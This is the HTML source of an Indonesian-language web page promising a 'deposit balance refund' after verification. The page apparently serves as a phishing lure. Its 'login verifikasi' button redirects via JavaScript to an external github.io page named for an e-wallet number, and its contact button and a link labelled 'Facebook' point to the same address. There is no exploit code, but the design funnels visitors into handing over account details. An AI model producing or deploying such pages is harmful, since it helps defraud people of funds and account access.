<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>PENGEMBALIAN DEPOSIT ✅</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      min-height: 100vh;
      background-image: url('motor-bg.jpg');
      background-size: cover;
      background-position: center;
      background-repeat: no-repeat;
      background-attachment: fixed;
      color: white;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
    }

    h1 {
      font-size: 2.2rem;
      margin-bottom: 1rem;
    }

    p {
      font-size: 1.1rem;
      color: #ddd;
      margin-bottom: 1.5rem;
      line-height: 1.6;
      text-align: center;
    }

    .btn-masuk, .btn-kontak {
      display: inline-block;
      background-color: #25D366;
      color: white;
      padding: 12px 20px;
      border-radius: 8px;
      text-decoration: none;
      font-weight: bold;
      font-size: 1.1rem;
      margin: 5px;
      transition: transform 0.2s, background-color 0.3s;
      box-shadow: 0 4px 10px rgba(0,0,0,0.3);
    }

    .btn-masuk:hover, .btn-kontak:hover {
      background-color: #1db954;
      transform: scale(1.05);
    }

    .sosmed {
      margin-top: 1.5rem;
    }

    .sosmed a {
      margin: 8px;
      display: inline-block;
      padding: 10px 15px;
      border-radius: 6px;
      color: #fff;
      text-decoration: none;
      font-weight: bold;
      font-size: 0.95rem;
      transition: background-color 0.3s, transform 0.2s;
    }

    .sosmed a:hover {
      transform: scale(1.05);
    }

    .facebook { background-color: #1877F2; }
    .instagram { background-color: #E1306C; }
    .tiktok { background-color: #010101; }
    .whatsapp { background-color: #25D366; }
    .kaos-btn { background-color: #FF6347; }

    #kaosGambar {
      display: none;
      margin-top: 1.5rem;
      max-width: 90%;
      border-radius: 10px;
      box-shadow: 0 0 20px rgba(0,0,0,0.6);
      animation: fadeIn 0.5s ease;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }

    @keyframes fadeOut {
      from { opacity: 1; transform: translateY(0); }
      to { opacity: 0; transform: translateY(20px); }
    }

    .fade-out {
      animation: fadeOut 0.5s forwards;
    }
  </style>
  <script>
    function masukHalaman() {
      document.body.classList.add('fade-out');
      setTimeout(() => {
        window.location.href = 'https://b813743.github.io/NOMOR-DANA/';
      }, 500);
    }

    function tampilkanGambarKaos() {
      const img = document.getElementById('kaosGambar');
      img.style.display = img.style.display === 'none' ? 'block' : 'none';
    }
  </script>
</head>
<body>
  <h1><strong>PENGEMBALIAN SALDO DEPOSIT ✅</strong></h1>
  <p>
    Saldo dana deposit akan dikembalikan ke rekening pengguna setelah proses verifikasi selesai.
  </p>

  <a href="#" class="btn-masuk" onclick="masukHalaman()">login verifikasi</a>
  <a href="https://b813743.github.io/NOMOR-DANA/" class="btn-kontak" target="_blank">Hubungi Kami</a>

  <div class="sosmed">
    <a href="https://b813743.github.io/NOMOR-DANA/" class="verifikasi pengembalian" target="_blank">Facebook</a>
  </div>
</body>
</html>
